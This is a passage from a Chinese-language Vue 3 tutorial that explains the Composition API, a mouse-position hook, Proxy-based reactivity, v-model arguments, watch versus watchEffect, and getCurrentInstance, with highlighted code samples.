</code></pre></div><p><strong>10. Composition API</strong></p> <ul><li><code>reactive</code></li> <li><code>ref</code></li> <li><code>readonly</code></li> <li><code>watch</code>和<code>watchEffect</code></li> <li><code>setup</code></li> <li>生命周期钩子函数</li></ul> <h3 id="composition-api-如何实现逻辑复用"><a href="#composition-api-如何实现逻辑复用" class="header-anchor">#</a> Composition API 如何实现逻辑复用</h3> <ul><li>抽离逻辑代码到一个函数</li> <li>函数命名约定为<code>useXx</code>格式（<code>React Hooks</code>也是）</li> <li>在<code>setup</code>中引用<code>useXx</code>函数</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>mouse position {{x}} {{y}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> reactive <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>
<span class="token keyword">import</span> useMousePosition <span class="token keyword">from</span> <span class="token string">'./useMousePosition'</span>
<span class="token comment">// import useMousePosition2 from './useMousePosition'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'MousePosition'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> <span class="token punctuation">{</span> x<span class="token punctuation">,</span> y <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useMousePosition</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            x<span class="token punctuation">,</span>
            y
        <span class="token punctuation">}</span>

        <span class="token comment">// const state = useMousePosition2()</span>
        <span class="token comment">// return {</span>
        <span class="token comment">//     state</span>
        <span class="token comment">// }</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> reactive<span class="token punctuation">,</span> ref<span class="token punctuation">,</span> onMounted<span class="token punctuation">,</span> onUnmounted <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">function</span> <span class="token function">useMousePosition</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> x <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">const</span> y <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        x<span class="token punctuation">.</span>value <span class="token operator">=</span> e<span class="token punctuation">.</span>pageX
        y<span class="token punctuation">.</span>value <span class="token operator">=</span> e<span class="token punctuation">.</span>pageY
    <span class="token punctuation">}</span>

    <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'useMousePosition mounted'</span><span class="token punctuation">)</span>
        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> update<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token function">onUnmounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'useMousePosition unMounted'</span><span class="token punctuation">)</span>
        window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> update<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token comment">// 合成函数尽量返回ref或toRefs(state)  state = reactive({})</span>
    <span class="token comment">// 这样在使用的时候可以解构但不丢失响应式</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>
        x<span class="token punctuation">,</span>
        y
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// function useMousePosition2() {</span>
<span class="token comment">//     const state = reactive({</span>
<span class="token comment">//         x: 0,</span>
<span class="token comment">//         y: 0</span>
<span class="token comment">//     })</span>

<span class="token comment">//     function update(e) {</span>
<span class="token comment">//         state.x = e.pageX</span>
<span class="token comment">//         state.y = e.pageY</span>
<span class="token comment">//     }</span>

<span class="token comment">//     onMounted(() =&gt; {</span>
<span class="token comment">//         console.log('useMousePosition mounted')</span>
<span class="token comment">//         window.addEventListener('mousemove', update)</span>
<span class="token comment">//     })</span>

<span class="token comment">//     onUnmounted(() =&gt; {</span>
<span class="token comment">//         console.log('useMousePosition unMounted')</span>
<span class="token comment">//         window.removeEventListener('mousemove', update)</span>
<span class="token comment">//     })</span>

<span class="token comment">//     return state</span>
<span class="token comment">// }</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> useMousePosition
<span class="token comment">// export default useMousePosition2</span>
</code></pre></div><h3 id="vue3如何实现响应式"><a href="#vue3如何实现响应式" class="header-anchor">#</a> Vue3如何实现响应式</h3> <ul><li>回顾<code>vue2</code>的<code>Object.defineProperty</code></li> <li>缺点
<ul><li>深度监听对象需要一次性递归</li> <li>无法监听新增属性、删除属性(<code>Vue.set</code>、<code>Vue.delete</code>)</li> <li>无法监听原生数组，需要特殊处理</li></ul></li> <li>学习<code>proxy</code>语法</li> <li><code>Vue3</code>中如何使用<code>proxy</code>实现响应式</li></ul> <h3 id="proxy-基本使用"><a href="#proxy-基本使用" class="header-anchor">#</a> Proxy 基本使用</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// const data = {</span>
<span class="token comment">//     name: 'zhangsan',</span>
<span class="token comment">//     age: 20,</span>
<span class="token comment">// }</span>
<span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span>

<span class="token keyword">const</span> proxyData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 只处理本身（非原型的）属性</span>
        <span class="token keyword">const</span> ownKeys <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ownKeys<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token comment">// 监听</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
        <span class="token keyword">return</span> result <span class="token comment">// 返回结果</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 重复的数据，不处理</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">===</span> target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'set'</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span>
        <span class="token comment">// console.log('result', result) // true</span>
        <span class="token keyword">return</span> result <span class="token comment">// 是否设置成功</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">deleteProperty</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'delete property'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
        <span class="token comment">// console.log('result', result) // true</span>
        <span class="token keyword">return</span> result <span class="token comment">// 是否删除成功</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="vue3用proxy-实现响应式"><a href="#vue3用proxy-实现响应式" class="header-anchor">#</a> vue3用Proxy 实现响应式</h3> <ul><li>深度监听，性能更好（获取到哪一层才触发响应式<code>get</code>，不是一次性递归）</li> <li>可监听<code>新增/删除</code>属性</li> <li>可监听数组变化</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 创建响应式</span>
<span class="token keyword">function</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token parameter">target <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> target <span class="token operator">!==</span> <span class="token string">'object'</span> <span class="token operator">||</span> target <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 不是对象或数组，则返回</span>
        <span class="token keyword">return</span> target
    <span class="token punctuation">}</span>

    <span class="token comment">// 代理配置</span>
    <span class="token keyword">const</span> proxyConf <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 只处理本身（非原型的）属性</span>
            <span class="token keyword">const</span> ownKeys <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>ownKeys<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token comment">// 监听</span>
            <span class="token punctuation">}</span>
    
            <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
        
            <span class="token comment">// 深度监听</span>
            <span class="token comment">// 性能如何提升的？获取到哪一层才触发响应式get，不是一次性递归</span>
            <span class="token keyword">return</span> <span class="token function">reactive</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 重复的数据，不处理</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">===</span> target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span>
            <span class="token punctuation">}</span>
    
            <span class="token keyword">const</span> ownKeys <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>ownKeys<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'已有的 key'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'新增的 key'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'set'</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span>
            <span class="token comment">// console.log('result', result) // true</span>
            <span class="token keyword">return</span> result <span class="token comment">// 是否设置成功</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token function">deleteProperty</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'delete property'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>
            <span class="token comment">// console.log('result', result) // true</span>
            <span class="token keyword">return</span> result <span class="token comment">// 是否删除成功</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 生成代理对象</span>
    <span class="token keyword">const</span> observed <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> proxyConf<span class="token punctuation">)</span>
    <span class="token keyword">return</span> observed
<span class="token punctuation">}</span>

<span class="token comment">// 测试数据</span>
<span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'zhangsan'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
    <span class="token literal-property property">info</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">city</span><span class="token operator">:</span> <span class="token string">'shenshen'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                <span class="token literal-property property">c</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                    <span class="token literal-property property">d</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                        <span class="token literal-property property">e</span><span class="token operator">:</span> <span class="token number">100</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> proxyData <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre></div><h3 id="v-model参数的用法"><a href="#v-model参数的用法" class="header-anchor">#</a> v-model参数的用法</h3> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- UserInfo组件 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">:value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span> <span class="token attr-name">@input</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>$emit(<span class="token punctuation">'</span>update:name<span class="token punctuation">'</span>, $event.target.value)<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">:value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>age<span class="token punctuation">&quot;</span></span> <span class="token attr-name">@input</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>$emit(<span class="token punctuation">'</span>update:age<span class="token punctuation">'</span>, $event.target.value)<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'UserInfo'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">props</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">name</span><span class="token operator">:</span> String<span class="token punctuation">,</span>
        <span class="token literal-property property">age</span><span class="token operator">:</span> String
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><div class="language-vue extra-class"><pre class="language-vue"><code><span class="token comment">&lt;!-- 使用 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user-info</span>
    <span class="token attr-name"><span class="token namespace">v-model:</span>name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>name<span class="token punctuation">&quot;</span></span>
    <span class="token attr-name"><span class="token namespace">v-model:</span>age</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>age<span class="token punctuation">&quot;</span></span>
<span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user-info</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="watch和watcheffect的区别"><a href="#watch和watcheffect的区别" class="header-anchor">#</a> watch和watchEffect的区别</h3> <ul><li>两者都可以监听<code>data</code>属性变化</li> <li><code>watch</code>需要明确监听哪个属性</li> <li><code>watchEffect</code>会根据其中的属性，自动监听其变化</li></ul> <div class="language-vue extra-class"><pre class="language-vue"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>watch vs watchEffect<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>{{numberRef}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>{{name}} {{age}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">{</span> reactive<span class="token punctuation">,</span> ref<span class="token punctuation">,</span> toRefs<span class="token punctuation">,</span> watch<span class="token punctuation">,</span> watchEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'Watch'</span><span class="token punctuation">,</span>
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> numberRef <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
        <span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
            <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span>
            <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token function">watchEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            <span class="token comment">// 初始化时，一定会执行一次（收集要监听的数据）</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello watchEffect'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">watchEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state.name'</span><span class="token punctuation">,</span> state<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">watchEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state.age'</span><span class="token punctuation">,</span> state<span class="token punctuation">.</span>age<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">watchEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state.age'</span><span class="token punctuation">,</span> state<span class="token punctuation">.</span>age<span class="token punctuation">)</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'state.name'</span><span class="token punctuation">,</span> state<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">25</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1500</span><span class="token punctuation">)</span>
        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            state<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'testA'</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span>
        

        <span class="token comment">// ref直接写</span>
        <span class="token comment">// watch(numberRef, (newNumber, oldNumber) =&gt; {</span>
        <span class="token comment">//     console.log('ref watch', newNumber, oldNumber)</span>
        <span class="token comment">// }</span>
        <span class="token comment">// // , {</span>
        <span class="token comment">// //     immediate: true // 初始化之前就监听，可选</span>
        <span class="token comment">// // }</span>
        <span class="token comment">// )</span>

        <span class="token comment">// setTimeout(() =&gt; {</span>
        <span class="token comment">//     numberRef.value = 200</span>
        <span class="token comment">// }, 1500)</span>

        <span class="token comment">// watch(</span>
        <span class="token comment">//     // 第一个参数，确定要监听哪个属性</span>
        <span class="token comment">//     () =&gt; state.age,</span>

        <span class="token comment">//     // 第二个参数，回调函数</span>
        <span class="token comment">//     (newAge, oldAge) =&gt; {</span>
        <span class="token comment">//         console.log('state watch', newAge, oldAge)</span>
        <span class="token comment">//     },</span>

        <span class="token comment">//     // 第三个参数，配置项</span>
        <span class="token comment">//     {</span>
        <span class="token comment">//         immediate: true, // 初始化之前就监听，可选</span>
        <span class="token comment">//         // deep: true // 深度监听</span>
        <span class="token comment">//     }</span>
        <span class="token comment">// )</span>

        <span class="token comment">// setTimeout(() =&gt; {</span>
        <span class="token comment">//     state.age = 25</span>
        <span class="token comment">// }, 1500)</span>
        <span class="token comment">// setTimeout(() =&gt; {</span>
        <span class="token comment">//     state.name = 'PoetryA'</span>
        <span class="token comment">// }, 3000)</span>

        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            numberRef<span class="token punctuation">,</span>
            <span class="token operator">...</span><span class="token function">toRefs</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="setup中如何获取组件实例"><a href="#setup中如何获取组件实例" class="header-anchor">#</a> setup中如何获取组件实例</h3> <ul><li>在<code>setup</code>和其他<code>composition API</code>中没有<code>this</code></li> <li>通过<code>getCurrentInstance</code>获取当前实例</li> <li>若使用<code>options API</code>可以照常使用<code>this</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> onMounted<span class="token punctuation">,</span> getCurrentInstance <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'GetInstance'</span><span class="token punctuation">,</span>
    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token punctuation">{</span>
            <span class="token literal-property property">x</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
            <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token number">2</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> 
    <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// setup是created beforeCreate 合集 组件还没正式初始化</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this1'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span>

        <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'this in onMounted'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token comment">// undefined</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span> instance<span class="token punctuation">.</span>data<span class="token punctuation">.</span>x<span class="token punctuation">)</span> <span class="token comment">// 1  onMounted中组件已经初始化了</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
 
        <span class="token keyword">const</span> instance <span class="token operator">=</span> <span class="token function">getCurrentInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
